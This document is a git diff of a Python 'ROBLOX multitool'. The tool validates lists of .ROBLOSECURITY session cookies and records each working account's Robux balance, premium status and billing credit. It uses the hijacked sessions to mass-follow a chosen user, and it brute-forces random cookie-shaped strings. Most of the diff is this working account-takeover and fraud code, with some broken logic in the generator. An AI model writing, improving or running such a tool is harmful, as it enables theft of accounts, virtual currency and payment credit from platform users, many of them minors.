@@ -1,7 +1,26 @@
-import requests
-import colorama
-import sys, os
-import time
+try:
+
+    import requests
+    import colorama
+    import sys, os
+    import time
+    import random
+    import string
+    import threading
+except:
+    print('You dont have the required modules installed! Trying to install required modules..')
+    try:
+        import os
+        os.system('cmd /k "pip install colorama --quiet"')
+        os.system('cmd /k "pip install time --quiet"')
+        os.system('cmd /k "pip install requests --quiet"')
+        os.system('cmd /k "pip install random --quiet"')
+        os.system('cmd /k "pip install string --quiet"')
+        import colorama, time, requests, random, string, threading
+
+    except:
+        print('Pip is not installed! Please reinstall python with pip and restart the multitool!')
+
 colorama.init(autoreset=True)
 #Continung l8ter
 session = requests.Session()
@@ -26,42 +45,272 @@ ROBLOX multitool
 
 print(beginning)
 
-def check_cookie():
-    def delete_line():
-        data = open(os.path.join(sys.path[0], "cookies.txt"), "r").read().splitlines(True)
-        open(os.path.join(sys.path[0], "cookies.txt"), "w").writelines(data[1:])
+cookie = str(open(os.path.join(sys.path[0], "cookies.txt"), "r").readline())
 
-    while os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
-        time.sleep(0.2)
-        headers = {
+def delete_line():
+    data = open(os.path.join(sys.path[0], "cookies.txt"), "r").read().splitlines(True)
+    open(os.path.join(sys.path[0], "cookies.txt"), "w").writelines(data[1:])
+
+def set_cookie():
+    headers = {
             'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
         }
-        session.headers = headers
-        cookie = str(open(os.path.join(sys.path[0], "cookies.txt"), "r").readline())
-        session.cookies['.ROBLOSECURITY'] = cookie
-        try:
-            r = session.post('https://www.roblox.com/api/item.ashx?=cool')
-        except ValueError:
-            print(colorama.Fore.RED + 'Invaild Cookie')
-            delete_line()
-            check_cookie()
-        session.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
-        r = session.get('https://api.roblox.com/currency/balance').json()
-        try:
-            if r['errors']:
-                print(colorama.Fore.RED + ('Not working'))
+    session.headers = headers
+    cookie = str(open(os.path.join(sys.path[0], "cookies.txt"), "r").readline())
+    session.cookies['.ROBLOSECURITY'] = cookie
+
+def check_cookie():
+    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
+        os.system('cls' if os.name == 'nt' else 'clear')
+        time.sleep(2)
+        print(beginning)
+        menu()
+    else:
+        while os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
+            time.sleep(0.2)
+            set_cookie()
+            try:
+                r = session.post('https://www.roblox.com/api/item.ashx?=cool')
+                session.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+                r = session.get('https://api.roblox.com/currency/balance').json()
+                try:
+                    if r['errors']:
+                        print(colorama.Fore.RED + 'Not working')
+                        delete_line()
+                        if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                            print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
+                            menu()
+                except KeyError:
+                    print(colorama.Fore.GREEN + 'Working')
+                    open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + ' | Checked with ScriptedWorlds ROBLOX multitool')
+                    delete_line()
+                    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                        time.sleep(2)
+                        os.system('cls' if os.name == 'nt' else 'clear')
+                        print(beginning)
+                        menu()
+            except ValueError:
+                print(colorama.Fore.RED + 'Invaild Cookie')
                 delete_line()
-        except KeyError:
-            print(colorama.Fore.GREEN + 'Working')
-            open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + ' | Checked with ScriptedWorlds multitool')
-            delete_line()
-            if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                    time.sleep(2)
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    print(beginning)
+                    menu()
+                else:
+                    check_cookie()
+
+def robux_checker():
+    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
+        time.sleep(2)
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(beginning)
+        menu()
+    else:
+        while os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
+            time.sleep(0.2)
+            set_cookie()
+            try:
+                r = session.post('https://www.roblox.com/api/item.ashx?=cool')
+                session.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+                r = session.get('https://api.roblox.com/currency/balance').json()
+                try:
+                    if r['errors']:
+                        print(colorama.Fore.RED + 'Not working')
+                        delete_line()
+                        if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
+                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                            time.sleep(2)
+                            os.system('cls' if os.name == 'nt' else 'clear')
+                            print(beginning)
+                            menu()
+                except KeyError:
+                    print(colorama.Fore.GREEN + 'Robux : ', r['robux'])
+                    open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + ' | Robux: ' + str(r['robux']) + ' Checked with ScriptedWorlds ROBLOX multitool')
+                    delete_line()
+                    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                        time.sleep(2)
+                        os.system('cls' if os.name == 'nt' else 'clear')
+                        print(beginning)
+                        menu()
+
+            except ValueError:
+                print(colorama.Fore.RED + 'Invaild Cookie')
+                delete_line()
+                if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                    time.sleep(2)
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    print(beginning)
+                    menu()
+                else:
+                    robux_checker()
+
+def credit_and_premium_checker():
+    time.sleep(0.2)
+    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
+        time.sleep(2)
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(beginning)
+        menu()
+
+    else:
+        while os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
+            set_cookie()
+            try:
+                r = session.post('https://www.roblox.com/api/item.ashx?=cool')
+                session.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+                r = session.get('https://billing.roblox.com/v1/paymentmethods?ap=3&_=1603642543474').json()
+                user_id = session.get('http://www.roblox.com/mobileapi/userinfo').json()
+                try:
+                    if r['errors']:
+                        print(colorama.Fore.RED + 'Not working')
+                        delete_line()
+                        if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                            time.sleep(2)
+                            os.system('cls' if os.name == 'nt' else 'clear')
+                            print(beginning)
+                            menu()
+                        else:
+                            credit_and_premium_checker()
+
+                except KeyError:
+                    print(colorama.Fore.GREEN + 'IsPremium: ' + str(user_id['IsPremium']) + ' |Credit: ' + str(r['currentCredit']) + '$' + ' |Allows Renewal: ' + str(r['allowCreditForRenewingPurchases']))
+                    open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + '| IsPremium: ' + str(user_id['IsPremium'])  + ' |Credit: ' + str(r['currentCredit']) + '$' + ' |Allows Renewal: ' + str(r['allowCreditForRenewingPurchases']) + ' |Checked with ScriptedWorlds ROBLOX multitool')
+                    delete_line()
+                    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                            time.sleep(2)
+                            os.system('cls' if os.name == 'nt' else 'clear')
+                            print(beginning)
+                            menu()
+
+                    else:
+                        credit_and_premium_checker()
+            except ValueError:
+                print(colorama.Fore.RED + 'Invaild Cookie')
+                delete_line()
+                if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                    time.sleep(2)
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    print(beginning)
+                    menu()
+                else:
+                    credit_and_premium_checker()
+
+        
+def mass_follow():
+    time.sleep(0.2)
+    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
+        time.sleep(2)
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(beginning)
+        menu()
+
+    else:
+        follower = input('User-ID : ')
+        while os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size != 0:
+            set_cookie()
+            try:
+                payload = {
+                    'followedUserId' : int(follower)
+                }
+                r = session.post('https://www.roblox.com/api/item.ashx?=cool')
+                session.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+                r = session.post('https://api.roblox.com/user/follow', data=payload).json()
+                try:
+                    if True in r.values():
+                        print(colorama.Fore.GREEN + 'Following')
+                        delete_line()
+                        if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                            time.sleep(2)
+                            os.system('cls' if os.name == 'nt' else 'clear')
+                            print(beginning)
+                            menu()
+                        else:
+                            mass_follow()
+                except KeyError:
+                    print(colorama.Fore.RED + 'Not working')
+                    delete_line()
+                    if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                        time.sleep(2)
+                        os.system('cls' if os.name == 'nt' else 'clear')
+                        print(beginning)
+                        menu()
+                    else:
+                        mass_follow()
+
+                    
+            except ValueError:
+                print(colorama.Fore.RED + 'Invaild Cookie')
+                delete_line()
+                if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
+                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                    time.sleep(2)
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    print(beginning)
+                    menu()
+                else:
+                    mass_follow()
+
+def generate_cookies():
+    number = int(input('How much cookies? : '))
+    if number == 0:
+        print(colorama.Fore.RED + 'Nice Try!')
+        time.sleep(2)
+        generate_cookies()
+        while number > 0:
+            if number == 0:
+                break
+                print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                time.sleep(2)
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(beginning)
                 menu()
+            number -= 1
+            strings = string.ascii_uppercase + string.digits
+            result = ''.join(random.choice(strings) for i in range(616))
+            open(os.path.join(sys.path[0], "cookies.txt"), "a").write('\n' + '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + result) # Not working at the moment
+            print(number)
+            if number == 0:
+                break
+                print(colorama.Fore.RED + 'Finished! Returning to menu..')
+                time.sleep(2)
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(beginning)
+                menu()
+    else:
+        print('Wrong Answer!')
+        generate_cookies()
 
 def menu():
-    choice = input('1) Cookie Checker\nSelect: \n')
+    choice = input('1) Cookie Checker\n2) Robux Checker\n3) Credit and Premium Checker\n4) Mass follow\n5) Cookie Generator\nSelect: \n')
     if choice == '1':
         check_cookie()
+
+    elif choice == '2':
+        robux_checker()
+
+    elif choice == '3':
+        credit_and_premium_checker()
+
+    elif choice == '4':
+        mass_follow()
+
+    elif choice == '5':
+        t = threading.Thread(target=generate_cookies)
+        t.start()
 
 
 def exit():
